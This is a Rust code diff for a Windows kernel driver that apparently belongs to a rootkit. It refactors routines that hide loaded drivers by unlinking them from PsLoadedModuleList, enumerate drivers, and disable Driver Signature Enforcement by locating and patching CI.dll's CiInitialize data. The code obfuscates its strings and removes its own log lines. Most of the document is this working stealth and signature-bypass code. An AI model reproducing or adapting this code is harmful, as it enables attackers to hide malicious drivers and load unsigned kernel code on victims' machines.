@@ -4,7 +4,7 @@ use {
     ntapi::ntldr::LDR_DATA_TABLE_ENTRY,
     core::sync::atomic::{AtomicPtr, Ordering}, 
     alloc::{string::String, vec::Vec, boxed::Box},
-    crate::utils::{get_function_address, get_module_base_address, uni}, 
+    crate::utils::{address::{get_function_address, get_module_base_address}, uni}, 
     shared::{
         structs::{
             DriverInfo, DSE, HiddenDriverInfo, LIST_ENTRY,
@@ -67,14 +67,10 @@ impl Driver {
 
         while next != current {
             let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
-            let buffer = core::slice::from_raw_parts(
-                (*list_entry).BaseDllName.Buffer,
-                ((*list_entry).BaseDllName.Length / 2) as usize,
-            );
+            let buffer = core::slice::from_raw_parts((*list_entry).BaseDllName.Buffer, ((*list_entry).BaseDllName.Length / 2) as usize);
             
             let name = String::from_utf16_lossy(buffer);
             if name.contains(driver_name) {
-                log::info!("Driver found: {name}");
                 let next = (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
                 let previous = (*list_entry).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY;
                 let list = LIST_ENTRY {
@@ -85,7 +81,6 @@ impl Driver {
                 let mut driver_info = DRIVER_INFO_HIDE.lock();
                 let list_ptr = Box::into_raw(Box::new(list));
                 let driver_entry = Box::into_raw(Box::new(*list_entry));
-                log::info!("Stored list entry at: {:?}", list_ptr);
             
                 driver_info.push(HiddenDriverInfo  {
                     name,
@@ -117,17 +112,18 @@ impl Driver {
     ///
     unsafe fn unhide_driver(driver_name: &String) -> NTSTATUS {
         let mut driver_info = DRIVER_INFO_HIDE.lock();
+
         if let Some(index) = driver_info.iter().position(|p| p.name == driver_name.as_str()) {
             let driver = &driver_info[index];
-            let list = driver.list_entry.load(Ordering::SeqCst);
-            let driver_entry = driver.driver_entry.load(Ordering::SeqCst);
-            if list.is_null() {
+            let list_entry = driver.list_entry.load(Ordering::SeqCst);
+            if list_entry.is_null() {
                 log::error!("List entry stored in AtomicPtr is null");
                 return STATUS_INVALID_PARAMETER;
             }
 
-            (*driver_entry).InLoadOrderLinks.Flink = (*list).Flink as *mut winapi::shared::ntdef::LIST_ENTRY;
-            (*driver_entry).InLoadOrderLinks.Blink = (*list).Blink as *mut winapi::shared::ntdef::LIST_ENTRY;
+            let driver_entry = driver.driver_entry.load(Ordering::SeqCst);
+            (*driver_entry).InLoadOrderLinks.Flink = (*list_entry).Flink as *mut winapi::shared::ntdef::LIST_ENTRY;
+            (*driver_entry).InLoadOrderLinks.Blink = (*list_entry).Blink as *mut winapi::shared::ntdef::LIST_ENTRY;
 
             let next = (*driver_entry).InLoadOrderLinks.Flink; // Driver (3)
             let previous = (*driver_entry).InLoadOrderLinks.Blink; // Driver (1)
@@ -137,7 +133,6 @@ impl Driver {
 
             driver_info.remove(index);
         } else {
-            log::info!("Driver ({driver_name}) Not found");
             return STATUS_UNSUCCESSFUL;
         }
         
@@ -153,19 +148,17 @@ impl Driver {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     ///
-    pub unsafe fn enumerate_driver(driver_info: *mut DriverInfo, information: &mut usize) -> NTSTATUS {
-        log::info!("Starting module enumeration");
-    
+    pub unsafe fn enumerate_driver(driver_info: *mut DriverInfo, information: &mut usize) -> Result<(), NTSTATUS> {
         let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
-        let func = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;
+        let ldr_data = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;
     
-        if func.is_null() {
+        if ldr_data.is_null() {
             log::error!("PsLoadedModuleList is null");
-            return STATUS_UNSUCCESSFUL;
+            return Err(STATUS_UNSUCCESSFUL);
         }
     
-        let current = func as *mut winapi::shared::ntdef::LIST_ENTRY;
-        let mut next = (*func).InLoadOrderLinks.Flink;
+        let current = ldr_data as *mut winapi::shared::ntdef::LIST_ENTRY;
+        let mut next = (*ldr_data).InLoadOrderLinks.Flink;
         let mut count = 0;
     
         while next != current {
@@ -191,7 +184,7 @@ impl Driver {
             next = (*next).Flink;
         }
     
-        STATUS_SUCCESS
+        Ok(())
     }
 
     /// Sets the DSE (Driver Signature Enforcement) status based on the information provided.
@@ -202,16 +195,9 @@ impl Driver {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     /// 
-    pub unsafe fn set_dse_state(info_dse: *mut DSE) -> NTSTATUS {
-        let module_address = match get_module_base_address(obfstr!("CI.dll")) {
-            Some(addr) => addr,
-            None => return STATUS_UNSUCCESSFUL
-        };
-        let function_address = match get_function_address(obfstr!("CiInitialize"), module_address) {
-            Some(addr) => addr,
-            None => return STATUS_UNSUCCESSFUL,
-        };
-
+    pub unsafe fn set_dse_state(info_dse: *mut DSE) -> Result<(), NTSTATUS> {
+        let module_address = get_module_base_address(obfstr!("CI.dll")).ok_or(STATUS_UNSUCCESSFUL)?;
+        let function_address = get_function_address(obfstr!("CiInitialize"), module_address).ok_or(STATUS_UNSUCCESSFUL)?;
         let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 0x89);
 
         // mov ecx,ebp
@@ -226,7 +212,6 @@ impl Driver {
         
             let new_base = function_address.cast::<u8>().offset((position + 4) as isize);
             let c_ip_initialize = new_base.cast::<u8>().offset(offset as isize);
-            log::info!("c_ip_initialize: {:?}", c_ip_initialize);
 
             // mov rbp,r9
             let instructions = [0x49, 0x8b, 0xE9];
@@ -252,7 +237,7 @@ impl Driver {
             }
         }
 
-        STATUS_SUCCESS
+        Ok(())
     }
 
 }
